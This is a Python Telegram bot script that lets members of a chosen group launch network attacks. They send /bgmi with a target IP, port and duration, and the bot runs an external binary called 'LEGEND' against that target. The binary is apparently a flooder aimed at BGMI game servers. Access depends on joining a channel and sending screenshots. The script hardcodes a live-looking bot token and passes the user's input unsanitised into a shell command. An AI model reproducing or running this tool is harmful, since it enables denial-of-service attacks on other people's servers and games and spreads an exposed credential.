
#!/usr/bin/python3
import telebot
import datetime
import time
import subprocess
import threading
from telebot import types
from keep_alive import keep_alive

# TELEGRAM BOT TOKEN
bot = telebot.TeleBot('7712914052:AAGFbu3pcLLNX9xV852bRHgw8rjJTHJD_Po')

# GROUP AND CHANNEL DETAILS
GROUP_ID = "-1002369239894"
CHANNEL_USERNAME = "@KHAPITAR_BALAK77"
SCREENSHOT_CHANNEL = "@KHAPITAR_BALAK77"
ADMINS = [7129010361]

# GLOBAL VARIABLES
is_attack_running = False
attack_end_time = None
pending_feedback = {}
warn_count = {}
attack_logs = []
user_attack_count = {}
used_targets = {} 

def is_user_in_channel(user_id):
    try:
        member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False

def verify_screenshot(user_id, message):
    if user_id in pending_feedback:
        bot.forward_message(SCREENSHOT_CHANNEL, message.chat.id, message.message_id)
        bot.send_message(SCREENSHOT_CHANNEL, f"📸 User `{user_id}` screenshot verified ✅", parse_mode="Markdown")
        bot.reply_to(message, "✅ Screenshot mil gaya! Ab naya attack laga sakta hai.")
        del pending_feedback[user_id]
    else:
        bot.reply_to(message, "❌ Screenshot bhejne ki zaroorat nahi hai abhi.")

@bot.message_handler(commands=['bgmi'])
def handle_attack(message):
    global is_attack_running, attack_end_time
    user_id = message.from_user.id
    command = message.text.split()

    if message.chat.id != int(GROUP_ID):
        bot.reply_to(message, "🚫 Yeh sirf specific group mein chalega.")
        return

    if not is_user_in_channel(user_id):
        bot.reply_to(message, f"Pehle channel join karo: {CHANNEL_USERNAME}")
        return

    if pending_feedback.get(user_id, False):
        bot.reply_to(message, "Pehle screenshot bhejo!")
        return

    if is_attack_running:
        bot.reply_to(message, "⚠️ Ek aur attack chal raha hai.")
        return

    if len(command) != 4:
        bot.reply_to(message, "⚠️ Usage: /3day <IP> <PORT> <TIME> 600")
        return

    target, port, duration = command[1], command[2], command[3]

    try:
        port = int(port)
        duration = int(duration)
    except ValueError:
        bot.reply_to(message, "❌ Port aur time number hone chahiye!")
        return

    if duration > 100:
        bot.reply_to(message, "🚫 Maximum 100s allowed!")
        return

    bot.send_message(message.chat.id, f"🔥 Attack Details:\nTarget: `{target}`\nPort: `{port}`\nDuration: `{duration}s`", parse_mode="Markdown")
    is_attack_running = True
    attack_end_time = datetime.datetime.now() + datetime.timedelta(seconds=duration)
    pending_feedback[user_id] = True

    try:
        subprocess.run(f"./LEGEND {target} {port} {duration} 900", shell=True, check=True, timeout=duration)
    except:
        bot.reply_to(message, "❌ Attack fail ya timeout ho gaya.")
    finally:
        is_attack_running = False
        attack_end_time = None
        bot.send_message(message.chat.id, "✅ Attack khatam! Screenshot bhejo.")

@bot.message_handler(content_types=['photo'])
def handle_screenshot(message):
    user_id = message.from_user.id
    verify_screenshot(user_id, message)

@bot.message_handler(commands=['check'])
def check_status(message):
    if is_attack_running:
        remaining = int((attack_end_time - datetime.datetime.now()).total_seconds())
        bot.reply_to(message, f"✅ Attack chal raha hai. Time left: {remaining}s")
    else:
        bot.reply_to(message, "❌ Koi attack active nahi hai.")

keep_alive()
bot.polling(none_stop=True)
